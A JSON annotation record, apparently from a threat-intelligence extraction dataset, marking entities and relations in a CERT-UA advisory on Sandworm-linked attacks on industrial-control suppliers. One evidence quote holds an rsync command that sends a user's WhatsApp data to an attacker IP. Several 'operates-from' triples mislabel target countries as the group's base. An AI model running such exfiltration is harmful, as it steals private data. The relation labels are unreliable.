@@ -1,0 +1,331 @@
+{
+  "docId": 6282517,
+  "date": "23.02.2025",
+  "title": "Цільова активність UAC-0212 у відношенні розробників та постачальників рішень АСУТП з метою здійснення кібератак на об'єкти критичної інфраструктури України (CERT-UA#13702)",
+  "entities": [
+    {
+      "id": "6282517:0",
+      "name": "UAC-0002",
+      "kind": "threat actor",
+      "gloss": "A Russian state-sponsored cyber espionage and sabotage group also known as Sandworm, APT44, and Seashell Blizzard.",
+      "scheme": "S19",
+      "category": "HackerGroup",
+      "role": "attacker"
+    },
+    {
+      "id": "6282517:1",
+      "name": "UAC-0133",
+      "kind": "threat group",
+      "gloss": "A threat cluster linked to Sandworm that conducted destructive attacks against Ukrainian energy, water, and heating utilities.",
+      "scheme": "S19",
+      "category": "HackerGroup",
+      "role": "related"
+    },
+    {
+      "id": "6282517:2",
+      "name": "UAC-0212",
+      "kind": "threat group",
+      "gloss": "A sub-cluster of UAC-0002 targeting industrial control system developers and critical infrastructure supply chains.",
+      "scheme": "S19",
+      "category": "HackerGroup",
+      "role": "attacker"
+    },
+    {
+      "id": "6282517:3",
+      "name": "CVE-2024-38213",
+      "kind": "vulnerability identifier",
+      "gloss": "A Windows SmartScreen security feature bypass vulnerability used to deliver malicious payloads.",
+      "scheme": "S4",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6282517:4",
+      "name": "SECONDBEST",
+      "kind": "malware family",
+      "gloss": "A malware tool utilized by Sandworm during cyber operations.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6282517:5",
+      "name": "EMPIREPAST",
+      "kind": "malware family",
+      "gloss": "A malware tool deployed in espionage operations associated with Sandworm.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6282517:6",
+      "name": "SPARK",
+      "kind": "malware family",
+      "gloss": "A malware utility used in malicious campaigns targeting organizational networks.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6282517:7",
+      "name": "CROOKBAG",
+      "kind": "malware family",
+      "gloss": "A Go-based loader malware used to execute payloads on compromised systems.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6282517:8",
+      "name": "PEAKLIGHT",
+      "kind": "malware family",
+      "gloss": "A malware dropper used to deliver secondary payloads during attacks.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "6282517:9",
+      "name": "RSYNC",
+      "kind": "software product",
+      "gloss": "A file synchronization utility leveraged by attackers for data exfiltration.",
+      "scheme": "S1",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6282517:10",
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A sovereign country in Eastern Europe.",
+      "scheme": "S6",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "6282517:11",
+      "name": "Сербія",
+      "kind": "country",
+      "gloss": "A sovereign country located in Southeast Europe.",
+      "scheme": "S6",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "6282517:12",
+      "name": "Чехія",
+      "kind": "country",
+      "gloss": "A sovereign country located in Central Europe.",
+      "scheme": "S6",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "6282517:13",
+      "name": "Microsoft",
+      "kind": "software vendor",
+      "gloss": "An American multinational corporation and technology vendor providing cybersecurity analysis.",
+      "scheme": "S3",
+      "category": "Organization",
+      "role": null
+    },
+    {
+      "id": "6282517:14",
+      "name": "Strike Ready",
+      "kind": "company",
+      "gloss": "A cybersecurity company providing threat intelligence and security operations solutions.",
+      "scheme": "S10",
+      "category": "Organization",
+      "role": null
+    },
+    {
+      "id": "6282517:15",
+      "name": "documents-reader[.]com",
+      "kind": "internet domain",
+      "gloss": "A malicious WebDAV domain used to host and distribute malicious files.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6282517:16",
+      "name": "object-storage-service[.]com",
+      "kind": "internet domain",
+      "gloss": "A domain used for malicious infrastructure and CROOKBAG operations.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "attacker"
+    },
+    {
+      "id": "6282517:17",
+      "name": "cdnauthsoft[.]com",
+      "kind": "internet domain",
+      "gloss": "A domain used for command and control or delivery of SPARK malware.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "attacker"
+    },
+    {
+      "id": "6282517:18",
+      "name": "protectconnections[.]com",
+      "kind": "internet domain",
+      "gloss": "A domain used in connection with EMPIREPAST malware infrastructure.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "attacker"
+    },
+    {
+      "id": "6282517:19",
+      "name": "protectraid[.]com",
+      "kind": "internet domain",
+      "gloss": "A WebDAV domain used by attackers to distribute malicious LNK files.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6282517:20",
+      "name": "adobeprotectcheck[.]com",
+      "kind": "internet domain",
+      "gloss": "A malicious WebDAV domain registered for payload staging.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6282517:21",
+      "name": "gieannualconferenceinmunich[.]com",
+      "kind": "internet domain",
+      "gloss": "A malicious WebDAV domain used to host spear-phishing lures.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6282517:22",
+      "name": "annualgieconferenceinmunich2024[.]com",
+      "kind": "internet domain",
+      "gloss": "A malicious WebDAV domain used to distribute malicious LNK lures.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6282517:23",
+      "name": "91.232.31.178",
+      "kind": "ip address",
+      "gloss": "An IP address hosting an RSYNC server used for data exfiltration.",
+      "scheme": "S13",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "6282517:24",
+      "name": "info@agro-sk.com.ua",
+      "kind": "e-mail address",
+      "gloss": "A compromised corporate email address abused to conduct spear-phishing communications.",
+      "scheme": "S14",
+      "category": "Domain",
+      "role": "related"
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0133",
+      "type": "associated-with-group",
+      "tail": "UAC-0002",
+      "evidence": "кластер загроз UAC-0133, який з високим рівнем впевненості мав відношення до UAC-0002"
+    },
+    {
+      "head": "UAC-0212",
+      "type": "associated-with-group",
+      "tail": "UAC-0002",
+      "evidence": "UAC-0212, який є субкластером UAC-0002"
+    },
+    {
+      "head": "UAC-0002",
+      "type": "exploited-vulnerability",
+      "tail": "CVE-2024-38213",
+      "evidence": "у поєднанні з експлуатацією вразливості CVE-2024-38213"
+    },
+    {
+      "head": "UAC-0002",
+      "type": "uses-tool",
+      "tail": "SECONDBEST",
+      "evidence": "серед іншого, використовувалися такі: SECONDBEST / EMPIREPAST"
+    },
+    {
+      "head": "UAC-0002",
+      "type": "uses-tool",
+      "tail": "EMPIREPAST",
+      "evidence": "серед іншого, використовувалися такі: SECONDBEST / EMPIREPAST"
+    },
+    {
+      "head": "UAC-0002",
+      "type": "uses-tool",
+      "tail": "SPARK",
+      "evidence": "серед іншого, використовувалися такі: SECONDBEST / EMPIREPAST, SPARK"
+    },
+    {
+      "head": "UAC-0002",
+      "type": "uses-tool",
+      "tail": "CROOKBAG",
+      "evidence": "використовувалися такі: SECONDBEST / EMPIREPAST, SPARK, CROOKBAG"
+    },
+    {
+      "head": "UAC-0002",
+      "type": "uses-tool",
+      "tail": "RSYNC",
+      "evidence": "з метою довготривалого викрадення документів, також було застосовано RSYNC"
+    },
+    {
+      "head": "UAC-0002",
+      "type": "operates-from",
+      "tail": "Україна",
+      "evidence": "здійснено цільові атаки у відношенні підприємств-постачальників з Сербії, Чехії, України"
+    },
+    {
+      "head": "UAC-0002",
+      "type": "operates-from",
+      "tail": "Сербія",
+      "evidence": "здійснено цільові атаки у відношенні підприємств-постачальників з Сербії, Чехії, України"
+    },
+    {
+      "head": "UAC-0002",
+      "type": "operates-from",
+      "tail": "Чехія",
+      "evidence": "здійснено цільові атаки у відношенні підприємств-постачальників з Сербії, Чехії, України"
+    },
+    {
+      "head": "RSYNC",
+      "type": "connects-to-ip",
+      "tail": "91.232.31.178",
+      "evidence": "rsync.exe -ar --files-from=- /cygdrive/c/Users/%USERPROFILE%/AppData/Local/Packages/%APP_ID%.WhatsAppDesktop_%APP_PACKAGE_ID% %USERNAME%@91.232.31.178::rsync_server"
+    },
+    {
+      "head": "UAC-0212",
+      "type": "abuses-account",
+      "tail": "info@agro-sk.com.ua",
+      "evidence": "info@agro-sk.com.ua (скомпрометований обліковий запис)"
+    },
+    {
+      "head": "object-storage-service[.]com",
+      "type": "hosts-file",
+      "tail": "CROOKBAG",
+      "evidence": "object-storage-service[.]com 2025-02-20 ordertld.com (CROOKBAG)"
+    },
+    {
+      "head": "cdnauthsoft[.]com",
+      "type": "hosts-file",
+      "tail": "SPARK",
+      "evidence": "cdnauthsoft[.]com 2024-10-30 onamae.com (SPARK)"
+    },
+    {
+      "head": "protectconnections[.]com",
+      "type": "hosts-file",
+      "tail": "EMPIREPAST",
+      "evidence": "protectconnections[.]com 2024-09-18 publicdomainregistry.com (EMPIREPAST)"
+    }
+  ],
+  "unclassified": []
+}
